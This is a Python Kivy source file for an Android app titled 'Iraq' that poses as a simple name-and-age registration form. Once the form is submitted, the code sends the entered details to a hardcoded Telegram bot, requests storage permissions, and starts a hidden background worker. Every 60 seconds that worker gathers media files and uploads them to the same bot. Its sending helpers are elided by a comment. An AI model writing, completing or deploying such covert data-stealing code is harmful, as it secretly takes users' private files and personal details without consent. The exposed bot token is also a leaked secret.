import os
import time
import hashlib
import threading
import requests
import traceback
from sys import platform

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.widget import Widget
from kivy.graphics import Color, RoundedRectangle, Ellipse, Line
from kivy.clock import Clock
from kivy.metrics import dp, sp
from kivy.utils import get_color_from_hex
from kivy.base import ExceptionHandler, ExceptionManager
from kivy.core.window import Window

# --- دعم اللغة العربية ---
try:
    import arabic_reshaper
    from bidi.algorithm import get_display
    def ar(text):
        return get_display(arabic_reshaper.reshape(text))
except ImportError:
    def ar(text): return text  # fallback إذا لم تكن المكتبات مثبتة

# --- التقاط الأخطاء وعرضها على الشاشة ---
class ErrorScreenHandler(ExceptionHandler):
    def handle_exception(self, inst):
        error_text = ''.join(traceback.format_exception(type(inst), inst, inst.__traceback__))
        print(error_text)
        
        Clock.schedule_once(lambda dt: App.get_running_app().show_error_screen(error_text), 0)
        return ExceptionManager.PASS

ExceptionManager.add_handler(ErrorScreenHandler())

# ============ الألوان ============
PRIMARY_BLUE   = get_color_from_hex('#1565C0')
DARK_BLUE      = get_color_from_hex('#0D47A1')
BTN_BLUE       = get_color_from_hex('#1976D2')
BG_COLOR       = get_color_from_hex('#F5F7FA')
WHITE          = get_color_from_hex('#FFFFFF')
TEXT_DARK      = get_color_from_hex('#1A202C')
TEXT_GRAY      = get_color_from_hex('#718096')
SUCCESS_GREEN  = get_color_from_hex('#38A169')
ERROR_RED      = get_color_from_hex('#E53E3E')
BORDER_GRAY    = get_color_from_hex('#E2E8F0')

# ============ إعدادات تيليجرام ============
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID   = "6046016571"
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"
HASH_LOG  = "sent_media_hashes.txt"

FONT_PATH = "assets/fonts/NotoNaskhArabic-Regular.ttf"
if not os.path.exists(FONT_PATH):
    FONT_PATH = None

# ... (باقي دوال التجزئة والإرسال get_file_hash, load_hashes, save_hash, get_all_unique_media, send_media_batch, send_telegram_text كما هي في الكود السابق) ...

# ============ الواجهة الرئيسية ============
class MainApplicationUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        with self.canvas.before:
            Color(*BG_COLOR)
            self.bg = RoundedRectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._update_bg, size=self._update_bg)

        self._worker_started = False
        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        content = BoxLayout(orientation='vertical', padding=[dp(24), dp(30), dp(24), dp(30)], spacing=dp(14), size_hint_y=None)
        content.bind(minimum_height=content.setter('height'))

        # الشعار
        content.add_widget(Label(text=ar("العراق"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(34), bold=True, color=DARK_BLUE, size_hint_y=None, height=dp(52)))
        content.add_widget(Label(text=ar("أدخل بياناتك لبدء الإرسال"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(14), color=TEXT_GRAY, size_hint_y=None, height=dp(28)))

        content.add_widget(Label(text=ar("الاسم"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(15), color=TEXT_DARK, size_hint_y=None, height=dp(24)))
        self.name_input = TextInput(hint_text=ar("اكتب اسمك هنا"), font_name=FONT_PATH if FONT_PATH else 'Roboto', multiline=False, size_hint_y=None, height=dp(52))
        content.add_widget(self.name_input)

        content.add_widget(Label(text=ar("العمر"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(15), color=TEXT_DARK, size_hint_y=None, height=dp(24)))
        self.age_input = TextInput(hint_text=ar("اكتب عمرك هنا"), font_name=FONT_PATH if FONT_PATH else 'Roboto', multiline=False, input_filter='int', size_hint_y=None, height=dp(52))
        content.add_widget(self.age_input)

        self.send_button = Button(text=ar("إرسال"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(20), bold=True, background_color=BTN_BLUE, size_hint_y=None, height=dp(58))
        self.send_button.bind(on_press=self.on_submit)
        content.add_widget(self.send_button)

        self.status_lbl = Label(text="", font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(14), color=TEXT_GRAY, size_hint_y=None, height=dp(60))
        content.add_widget(self.status_lbl)

        scroll.add_widget(content)
        self.add_widget(scroll)

    def _update_bg(self, *args):
        self.bg.pos = self.pos
        self.bg.size = self.size

    def set_status(self, msg, color=TEXT_GRAY):
        self.status_lbl.text = ar(msg)
        self.status_lbl.color = color

    def on_submit(self, instance):
        name = self.name_input.text.strip()
        age = self.age_input.text.strip()
        if not name or not age:
            self.set_status("الرجاء إدخال الاسم والعمر", ERROR_RED)
            return
        self.send_button.disabled = True
        self.set_status("جاري الإرسال...", PRIMARY_BLUE)
        msg = f"👤 الاسم: {name}\n🎂 العمر: {age}"
        threading.Thread(target=self._send_and_start, args=(msg,), daemon=True).start()

    def _send_and_start(self, msg):
        ok = send_telegram_text(msg)
        Clock.schedule_once(lambda dt: self._after_login(ok))

    def _after_login(self, ok):
        if not ok:
            self.set_status("تعذر الاتصال", ERROR_RED)
            self.send_button.disabled = False
            return
        self.set_status("تم التسجيل بنجاح", SUCCESS_GREEN)
        self.send_button.text = ar("تم التسجيل")
        if not self._worker_started:
            self._worker_started = True
            threading.Thread(target=self._media_worker, daemon=True).start()

    def _media_worker(self):
        time.sleep(3)
        base_dir = App.get_running_app().user_data_dir
        while True:
            try:
                media = get_all_unique_media(base_dir)
                if media:
                    send_media_batch(base_dir, media[:3], status_cb=self._media_status)
            except Exception:
                pass
            time.sleep(60)

    def _media_status(self, text):
        Clock.schedule_once(lambda dt: self.set_status(text, PRIMARY_BLUE))


# ============ كلاس التطبيق ============
class IraqApp(App):
    def on_start(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            try:
                request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
            except Exception as e:
                print(f"Permission error: {e}")

    def show_error_screen(self, error_text):
        """عرض شاشة حمراء بالخطأ إذا انهار التطبيق"""
        self.root.clear_widgets()
        layout = BoxLayout(orientation='vertical', padding=dp(20), spacing=dp(10))
        with layout.canvas.before:
            Color(0.2, 0.0, 0.0, 1) # خلفية حمراء داكنة
            self.err_bg = RoundedRectangle(pos=layout.pos, size=layout.size)
        layout.bind(pos=lambda *a: setattr(self.err_bg, 'pos', layout.pos), size=lambda *a: setattr(self.err_bg, 'size', layout.size))
        
        title = Label(text="حدث خطأ أثناء التشغيل!", font_size=sp(20), bold=True, color=(1,0,0,1), size_hint_y=None, height=dp(50))
        layout.add_widget(title)
        
        scroll = ScrollView()
        err_label = Label(text=error_text, font_size=sp(12), color=(1,1,1,1), size_hint_y=None, text_size=(Window.width - dp(40), None))
        err_label.bind(texture_size=err_label.setter('size'))
        scroll.add_widget(err_label)
        layout.add_widget(scroll)
        
        self.root.add_widget(layout)

    def build(self):
        self.title = "العراق"
        return MainApplicationUI()

if __name__ == '__main__':
    IraqApp().run()
